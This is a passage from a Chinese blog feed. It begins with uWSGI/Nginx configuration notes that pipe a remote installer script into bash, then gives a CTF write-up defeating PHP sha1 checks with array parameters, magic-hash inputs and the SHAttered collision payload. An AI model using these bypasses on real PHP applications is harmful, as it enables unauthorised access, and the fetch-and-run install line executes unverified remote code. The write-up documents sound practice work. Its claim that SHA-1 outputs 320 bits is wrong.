class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">uwsgi_param  QUERY_STRING       $query_string;</span><br><span class="line">uwsgi_param  REQUEST_METHOD     $request_method;</span><br><span class="line">uwsgi_param  CONTENT_TYPE       $content_type;</span><br><span class="line">uwsgi_param  CONTENT_LENGTH     $content_length;</span><br><span class="line"></span><br><span class="line">uwsgi_param  REQUEST_URI        $request_uri;</span><br><span class="line">uwsgi_param  PATH_INFO          $document_uri;</span><br><span class="line">uwsgi_param  DOCUMENT_ROOT      $document_root;</span><br><span class="line">uwsgi_param  SERVER_PROTOCOL    $server_protocol;</span><br><span class="line">uwsgi_param  REQUEST_SCHEME     $scheme;</span><br><span class="line">uwsgi_param  HTTPS              $https if_not_empty;</span><br><span class="line"></span><br><span class="line">uwsgi_param  REMOTE_ADDR        $remote_addr;</span><br><span class="line">uwsgi_param  REMOTE_PORT        $remote_port;</span><br><span class="line">uwsgi_param  SERVER_PORT        $server_port;</span><br><span class="line">uwsgi_param  SERVER_NAME        $server_name;</span><br></pre></td></tr></table></figure><p>这里的uwsgi_modifier1 9; </p><p>这里所谓的魔术变量 可以理解为 Nginx 对 uwsgi 发送命令的操作类型， 具体的指令可见：</p><blockquote><p><span class="exturl" data-url="aHR0cHM6Ly91d3NnaS1kb2NzLXpoLnJlYWR0aGVkb2NzLmlvL3poX0NOL2xhdGVzdC9WYXJzLmh0bWw=" title="https://uwsgi-docs-zh.readthedocs.io/zh_CN/latest/Vars.html">uwsgi协议魔术变量<i class="fa fa-external-link"></i></span></p></blockquote><h2 id="Uwsgi"><a href="#Uwsgi" class="headerlink" title="Uwsgi"></a>Uwsgi</h2><h3 id="default-amp-cgi"><a href="#default-amp-cgi" class="headerlink" title="default &amp; cgi"></a>default &amp; cgi</h3><p>这个问题，真的是巨大的坑，由于资料较少，最后是在官方文件发现的这一个问题。</p><p>在Uwsgi 进行编译安装之后执行 CGI 请求的时候返回一以下内容</p><blockquote><p>no python application found, check your startup logs for errors</p></blockquote><hr><p>在进行问题的查证，看了手册后发现，uwsgi 的不同编译参数对应了不同的版本，有默认版本 ，和CGI 版本。</p><p>编译命令如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://uwsgi.it/install | bash -s default /tmp/uwsgi.cgi# 这个版本需要和web应用联系</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://uwsgi.it/install | bash -s cgi /tmp/uwsgi.default# 这个版本的才能用于 nginx</span><br></pre></td></tr></table></figure><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><blockquote><p>在官方 的文档里提供了详尽的 配置，已经优化的各种方法</p><ul><li><span class="exturl" data-url="aHR0cHM6Ly91d3NnaS1kb2NzLXpoLnJlYWR0aGVkb2NzLmlvL3poX0NOL2xhdGVzdC9DR0kuaHRtbA==" title="https://uwsgi-docs-zh.readthedocs.io/zh_CN/latest/CGI.html">在uWSGI上运行CGI脚本<i class="fa fa-external-link"></i></span></li></ul></blockquote><h2 id="其他Q"><a href="#其他Q" class="headerlink" title="其他Q"></a>其他Q</h2><h3 id="MIME-的问题"><a href="#MIME-的问题" class="headerlink" title="MIME 的问题"></a>MIME 的问题</h3><p><strong>MIME</strong>(Multipurpose Internet Mail Extensions)多用途互联网邮件扩展类型。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">print</span> (<span class="string">"Content-type:text/html"</span>)</span><br><span class="line"><span class="keyword">print</span></span><br></pre></td></tr></table></figure><p>在 CGI 脚本的执行过程中，必须有 MIME 的头，否则脚本执行时 发生 502</p><h3 id="MIME-的问题-2"><a href="#MIME-的问题-2" class="headerlink" title="MIME 的问题 2"></a>MIME 的问题 2</h3><p>没错，这个 MIME 又出问题了， 在同样环境的主机上面，做了平行迁移，于是就出了问题。测试其他的脚本没有问题，测试这个 功能脚本就有问题了，进行对比发现了一个诡异的规律：</p><p>这个 CGI 脚本是可以正常执行的。 返回 200</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> cgi</span><br><span class="line"><span class="keyword">import</span> cgitb</span><br><span class="line">cgitb.enable()</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> (<span class="string">"Content-type:text/html"</span>)</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"><span class="keyword">print</span> (<span class="string">'pass'</span>)</span><br></pre></td></tr></table></figure><p>然后下面这个，就直接 报错 502 ， invalid CGI response!!!.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> cgi</span><br><span class="line"><span class="keyword">import</span> cgitb</span><br><span class="line">cgitb.enable()</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.chdir(<span class="string">'/'</span>)</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">sys.path.append(<span class="string">".."</span>)</span><br><span class="line"><span class="keyword">from</span> util <span class="keyword">import</span> util, db_mysql</span><br><span class="line"></span><br><span class="line">print(<span class="string">"Content-type:text/html"</span>)</span><br><span class="line"><span class="keyword">print</span></span><br></pre></td></tr></table></figure><p>综上,发现问题，MIME 头需要在用户的自定模块前打印，否则导致脚本 502！</p>]]></content:encoded>
      
      <comments>https://www.diglp.xyz/2018/10/13/OP_Uwsgi%20%E9%85%8D%E7%BD%AE%E9%97%AE%E9%A2%98%E8%AE%B0%E5%BD%95/#disqus_thread</comments>
    </item>
    
    <item>
      <title>某个简单CTF的WP</title>
      <link>https://www.diglp.xyz/2018/10/03/CTF_Writeup/</link>
      <guid>https://www.diglp.xyz/2018/10/03/CTF_Writeup/</guid>
      <pubDate>Tue, 02 Oct 2018 16:00:00 GMT</pubDate>
      <description>
      
        
        
          
          
            &lt;h2 id=&quot;前&quot;&gt;&lt;a href=&quot;#前&quot; class=&quot;headerlink&quot; title=&quot;前&quot;&gt;&lt;/a&gt;前&lt;/h2&gt;&lt;p&gt;得找到自己的一点点爱好吧，不然闲暇真是 boring 。&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;晚上突然的心血来潮，找了个CTF
          
        
      
      </description>
      
      <content:encoded><![CDATA[<h2 id="前"><a href="#前" class="headerlink" title="前"></a>前</h2><p>得找到自己的一点点爱好吧，不然闲暇真是 boring 。</p><hr><p>晚上突然的心血来潮，找了个CTF 的网站，手头没什么工具，所以就怎么简单怎么来啦。</p><ul><li><p>amigos2001在2018-10-01 01:51:08解出了misc-4</p></li><li><p>amigos2001在2018-10-01 01:45:53解出了misc-2</p></li><li><p>amigos2001在2018-10-01 01:36:43解出了misc-1</p></li><li><p>amigos2001在2018-10-01 01:29:45解出了code-1</p></li><li><p>amigos2001在2018-10-01 00:47:28解出了web-2</p></li><li><p>amigos2001在2018-10-01 00:37:38解出了web-1</p></li></ul><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="SHA1-碰撞？"><a href="#SHA1-碰撞？" class="headerlink" title="SHA1 碰撞？"></a>SHA1 碰撞？</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">'flag.php'</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[a]) &amp;&amp; <span class="keyword">isset</span>($_GET[b]))</span><br><span class="line">&#123;</span><br><span class="line">    $c = $_GET[a];</span><br><span class="line">    $d = $_GET[b];</span><br><span class="line">    <span class="keyword">if</span>($c != $d &amp;&amp; sha1($c)===sha1($d))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'you got it&lt;br&gt;'</span>;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'try again&lt;br&gt;'</span>;</span><br><span class="line">        show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><p>TIPs:</p><ul><li>isset() 是判断变量是否被赋值的函数</li><li>$_GET[] php的特性全局变量</li><li>sha1() 常用的哈希算法 输出 320 (40*8bit) 位</li><li>show<em>source(\</em>_FILE__);</li></ul><hr><p>上面的就是题目，这个代码逻辑，不难看出。最后是需要一个同时满足：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$c != $d &amp;&amp; sha1($c)===sha1($d)</span><br></pre></td></tr></table></figure><p>这样的条件的一个输入。如果乍一看，发现要 两个输入的变量不同，然而这个变量对应的哈希又要是一样的，这个是碰撞 ？ Collusion？显然不会这么直接吧？</p><p>KEY：<strong>PHP 中 哈希函数的问题</strong> （PHP 作为动态弱类型的语言，导致安全性的问题）</p><blockquote><p>如果 GET 参数中设置 <code>name[]=a</code>，那么 <code>$_GET[&#39;name&#39;] = [a]</code>，php 会把 <code>[]=a</code> 当成数组传入， <code>$_GET</code> 会自动对参数调用 <code>urldecode</code>。</p><p><code>$_POST</code> 同样存在此漏洞，提交的表单数据，<code>user[]=admin</code>，<code>$_POST[&#39;user&#39;]</code> 得到的是 <code>[&#39;admin&#39;]</code> 是一个数组。</p></blockquote><p>这里可以控制，get的参数作为一个数组，专利由于 php 的hash 函数的性质，或者说是漏洞。对于 php中的hash 函数，输入一个 数组，得到的这时候，函数将会有一个警告，而且会返回 null，这里就有趣了，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sha1($c)===sha1($d) =&gt; null===null =&gt; true</span><br></pre></td></tr></table></figure><p>可见，我们很好的，就可以实现这里的条件啦。所以这里我们构造url</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">www.example.com/web?a[]=1&amp;b[]=2</span><br></pre></td></tr></table></figure><p>这里可见，ab都为数组，且 [1] &lt;&gt; [2] , 后面有满足了 null === null 的条件，所以我们 got flag。</p><h3 id="SHA1-碰撞"><a href="#SHA1-碰撞" class="headerlink" title="SHA1 碰撞 !?"></a>SHA1 碰撞 !?</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">'flag.php'</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[a]) &amp;&amp; <span class="keyword">isset</span>($_GET[b]))</span><br><span class="line">&#123;</span><br><span class="line">    $c = (string)$_GET[a];</span><br><span class="line">    $d = (string)$_GET[b];</span><br><span class="line">    <span class="keyword">if</span>($c != $d &amp;&amp; sha1($c)==sha1($d))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'you got it&lt;br&gt;'</span>;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'try again&lt;br&gt;'</span>;</span><br><span class="line">        show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>PHP 和 JS 一样，作为一个弱类型的语言，虽然的确给开发者提供了不少的编码自由，淡出其中的安全问题，也是的确的不能忽视。</p></blockquote><hr><p>这次，职业敏感的，直接把目光集中在这个条件语句上，这次，和上次有了些差别。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$c = (string)$_GET[a];</span><br><span class="line">$d = (string)$_GET[b];</span><br><span class="line"><span class="keyword">if</span>($c != $d &amp;&amp; sha1($c)==sha1($d))</span><br></pre></td></tr></table></figure><p>这里，使用了强制的类型转换，显然，这里把我们的传入数组的路子是封死了。不过，有转机的地方在于这个等于号。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$c != $d &amp;&amp; sha1($c)==sha1($d)</span><br></pre></td></tr></table></figure><p>前面的内容不同没有改变，后面的hash 相等，从 === 变成了 == 。</p><p>wiki 之    </p><blockquote><p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2l0aG9tZXIvYXJ0aWNsZS9kZXRhaWxzLzU4NTUyNDA=" title="https://blog.csdn.net/ithomer/article/details/5855240">浅析JavaScript和PHP中三个等号（===）和两个等号（==）的区别<i class="fa fa-external-link"></i></span></p><ul><li><p>==  两边值类型不同的时候，要先进行类型转换，再比较。 </p></li><li><p>=== 不做类型转换，类型不同的一定不等。</p></li></ul></blockquote><hr><p>简单来讲，== 只是要求值相等，而 === 要求类型和值。可见机会来了。有趣的是，这个要从科学计数法说起。</p><p>在科学计数法里面，<code>1e2 == 1*10^2</code>。 这样的语法在 C / 以及 PHP 等语言里面都是存在的。<code>1e2 == 10e1</code>那么 </p><p><code>0e123</code> 和 <code>0e456</code> 呢? 显然可见，在数值上讲，0 乘以的任意次幂，结果当然是 0 的。综上，== 会进行自动的类型转换。得到这样的推论。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'0e12123341231231'</span> == <span class="string">'0e612371973712937'</span></span><br></pre></td></tr></table></figure><p>现在，回去看题啦，我们要解决的问题是</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sha1($c)==sha1($d)</span><br></pre></td></tr></table></figure><p>一看便有了思路吧！对的，找到符号相同的结构的 hash 就好啦！是 <code>0e\d{38}</code> 类型的就好了！所以，我就天真的，天真的，天真了！！！</p><p>如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line">import hashlib as h</span><br><span class="line">for i in range(1,100000):</span><br><span class="line">hs = h.sha1(str(i).encode()).hexdigest()</span><br><span class="line">a = re.compile(&apos;0e\d&#123;38&#125;&apos;).match(hs)</span><br><span class="line">    if a:</span><br><span class="line">    print(a,i)</span><br></pre></td></tr></table></figure><p>这个概率当然是相当低的，不过自己还突然有了学习 OpenCL 的冲动。。。</p><hr><p>最后，的方案当然是求助Google了，这里找到了 magic Hashs。里面列举了，多个满足 <code>0e\d{38}</code>的这个条件。</p><blockquote><p><span class="exturl" data-url="aHR0cHM6Ly93d3cud2hpdGVoYXRzZWMuY29tL2Jsb2cvbWFnaWMtaGFzaGVzLw==" title="https://www.whitehatsec.com/blog/magic-hashes/">Magic Hashs<i class="fa fa-external-link"></i></span></p></blockquote><p>这里找到了这样的两个符合要求的输入</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">10932435112</span></span><br><span class="line">aaroZmOk</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>hashlib.sha1(<span class="string">'10932435112'</span>).hexdigest()</span><br><span class="line"><span class="string">'0e07766915004133176347055865026311692244'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>hashlib.sha1(<span class="string">'aaroZmOk'</span>).hexdigest()</span><br><span class="line"><span class="string">'0e66507019969427134894567494305185566735'</span></span><br></pre></td></tr></table></figure><h3 id="SHA1-·-真碰撞"><a href="#SHA1-·-真碰撞" class="headerlink" title="SHA1 · 真碰撞"></a>SHA1 · 真碰撞</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">'flag.php'</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[a]) &amp;&amp; <span class="keyword">isset</span>($_GET[b]))</span><br><span class="line">&#123;</span><br><span class="line">    $c = (string)$_GET[a];</span><br><span class="line">    $d = (string)$_GET[b];</span><br><span class="line">    <span class="keyword">if</span>($c != $d &amp;&amp; sha1($c)===sha1($d))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'you got it&lt;br&gt;'</span>;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'try again&lt;br&gt;'</span>;</span><br><span class="line">        show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>到了这里了，就发现了一些问题了，首先前面的强制类型转阻止了使用数组返回 null 的思路。可是后面是hash 比较，这里使用的是 <code>===</code> ，严格等于， 需要类型和其值相等，且不会进行类型转换。</p><p>感觉这次，是真的真的要进行碰撞了，在网上进行搜索</p><blockquote><ul><li><span class="exturl" data-url="aHR0cHM6Ly9zZWN1cml0eS5nb29nbGVibG9nLmNvbS8yMDE3LzAyL2Fubm91bmNpbmctZmlyc3Qtc2hhMS1jb2xsaXNpb24uaHRtbA==" title="https://security.googleblog.com/2017/02/announcing-first-sha1-collision.html">Announcing the first SHA1 collision  – Google Security Blog<i class="fa fa-external-link"></i></span></li></ul></blockquote><p>可见，Google 的确已经发现了第一个的 sha1 哈希碰撞</p><hr><p>对，后面的内容进行继续的探索，也很容易的发现了类似的 ctf 题目，有说是站姿巨人的肩膀上，所以这里学习，和记录了，链接在此 。</p><blockquote><ul><li><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2NhaXFpaXFpL2FydGljbGUvZGV0YWlscy82ODk1MzczMA==" title="https://blog.csdn.net/caiqiiqi/article/details/68953730">关于SHA1碰撞——比较两个binary的不同之处<i class="fa fa-external-link"></i></span></li></ul></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1&amp;</span><br><span class="line">b=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1</span><br></pre></td></tr></table></figure><p>得到了类似以上面的参数，进行提交，也的确得到了 flag。于是这个倒是水水的过了，最重要的是，看到了sha1 的碰撞的这件事。MD5 在 03/2005 已经被发现碰撞了。</p><h2 id="CODE"><a href="#CODE" class="headerlink" title="CODE"></a>CODE</h2><h3 id="CODE-1"><a href="#CODE-1" class="headerlink" title="CODE 1"></a>CODE 1</h3><p>这个也是比较简单的编码题目。题目如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">^q|l^7xm]\RpRnVj][9o\6Rlg6Z&#125;jUAA</span><br><span class="line"></span><br><span class="line">听说是移位+base64</span><br></pre></td></tr></table></figure><p>题目给出了明确的暗示，是位移加上 base64 , b64 这个加密的特点就是末尾的 == </p><blockquote><p>关于 == 的来源，这里 pick 一个好的文章</p><p><span class="exturl" data-url="aHR0cDovL3d3dy5ydWFueWlmZW5nLmNvbS9ibG9nLzIwMDgvMDYvYmFzZTY0Lmh0bWw=" title="http://www.ruanyifeng.com/blog/2008/06/base64.html">Base64 笔记 – 阮一峰<i class="fa fa-external-link"></i></span></p></blockquote><p>那么位移的思路，就是把 AA 移成 ==， 看一看 ascii 的顺序</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>ord(<span class="string">'A'</span>)</span><br><span class="line"><span class="number">65</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>ord(<span class="string">'='</span>)</span><br><span class="line"><span class="number">61</span></span><br></pre></td></tr></table></figure><p>所以我们的思路是向下位移， 接下来上脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="string">"^q|l^7xm]\RpRnVj][9o\6Rlg6Z&#125;jUAA"</span></span><br><span class="line">c = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):<span class="comment"># 为了验证思路多试几次</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> a:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            d = chr(ord(x) - i)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        c += d</span><br><span class="line">    print(c)</span><br><span class="line">    c = <span class="string">""</span></span><br></pre></td></tr></table></figure><p>代码跑完之后 得到这样的东西：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">^q|l^7xm]\RpRnVj][9o═Rlg6Z&#125;jUAA</span><br><span class="line">]p&#123;k]6wl\[QoQmUi\Z8n║Qkf5Y|iT@@</span><br><span class="line">\ozj\5vk[ZPnPlTh[Y7m╝Pje4X&#123;hS??</span><br><span class="line">[nyi[4ujZYOmOkSgZX6l╚Oid3WzgR&gt;&gt;</span><br><span class="line">ZmxhZ3tiYXNlNjRfYW5k╗Nhc2VyfQ==</span><br><span class="line">YlwgY2shXWMkMiQeXV4j╔Mgb1UxeP&lt;&lt;</span><br><span class="line">XkvfX1rgWVLjLhPdWU3i Lfa0TwdO;;</span><br><span class="line">WjueW0qfVUKiKgOcVT2hhKe`/SvcN::</span><br><span class="line">VitdV/peUTJhJfNbUS1ggJd_.RubM99</span><br><span class="line">UhscU.odTSIgIeMaTR0ffIc^-QtaL88</span><br></pre></td></tr></table></figure><p>显然我们找到了 == 的条件， 解码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">### Then</span></span><br><span class="line">b64 = <span class="string">"ZmxhZ3tiYXNlNjRfYW5k╗Nhc2VyfQ=="</span></span><br><span class="line">print(base64.b64decode(b64))</span><br></pre></td></tr></table></figure><p>解释器抛异常， 仔细一看混进去了一个奇怪的东西 <code>‘╗’</code>base64 出来都应该是 az09 才是。</p><p>尝试删除，替换无果后，回到原字符串， 找到导致这个符号的位置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a = &quot;^q|l^7xm]\RpRnVj][9o\6Rlg6Z&#125;jUAA&quot;</span><br><span class="line"> ^</span><br><span class="line">a = &quot;^q|l^7xm]\RpRnVj][9o\\6Rlg6Z&#125;jUAA&quot;</span><br></pre></td></tr></table></figure><p>随手拍脑袋，加个 <code>\</code> 再次解码 得到 flag；</p><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="Misc-1"><a href="#Misc-1" class="headerlink" title="Misc 1"></a>Misc 1</h3><p>这个题，简单类型，看到了 flag 几个字母，找找规律。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">finnsl_kc_at_e0ghf_k&#123;iei&#125;</span><br></pre></td></tr></table></figure><p>本想着一个个数的，数着数着就乱了，算了写脚本吧：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">a =<span class="string">"finnsl_kc_at_e0ghf_k&#123;iei&#125;"</span></span><br><span class="line">b=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="number">5</span>*i &lt; len(a):</span><br><span class="line">            b += a[<span class="number">5</span>*i+x]</span><br><span class="line">print(b)</span><br></pre></td></tr></table></figure><h2 id="后"><a href="#后" class="headerlink" title="后"></a>后</h2><p>难得闲暇的时间，可以去玩一下，自己喜欢的东西，希望以后，坚持一下这个爱好吧，不然每天过的太空洞。</p><h2 id="参考"><a href="#参考" 